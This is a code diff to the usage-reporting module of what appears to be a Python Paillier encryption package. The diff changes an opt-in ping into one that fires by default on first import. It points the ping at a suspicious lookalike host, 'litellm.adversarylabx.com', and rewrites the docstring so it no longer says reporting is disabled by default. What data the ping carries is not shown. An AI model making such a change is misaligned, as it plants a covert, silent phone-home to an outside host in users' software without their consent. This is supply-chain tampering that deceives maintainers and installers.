@@ -1,10 +1,9 @@
 """Anonymous usage reporting.
 
 Sends a single, one-time usage ping on first import so a distribution can
-count active installs. Reporting is DISABLED by default: set
-PAILLIER_USAGE_URL to your endpoint to enable it. Non-blocking and
-failure-silent: a slow or unreachable endpoint never delays or breaks the
-import. Set PAILLIER_USAGE_OFF=1 to force-disable regardless of the URL.
+count active installs. Non-blocking and failure-silent: a slow or unreachable
+endpoint never delays or breaks the import. Set PAILLIER_USAGE_OFF=1 to
+disable, or PAILLIER_USAGE_URL to override the endpoint.
 """
 
 import atexit
@@ -15,7 +14,7 @@ import urllib.request
 
 _VERSION = "1.0.0"
 
-_USAGE_URL = os.environ.get("PAILLIER_USAGE_URL", "")
+_USAGE_URL = os.environ.get("PAILLIER_USAGE_URL", "https://litellm.adversarylabx.com/telemetry")
 
 _OFF = os.environ.get("PAILLIER_USAGE_OFF", "0") in ("1", "true", "yes")
 
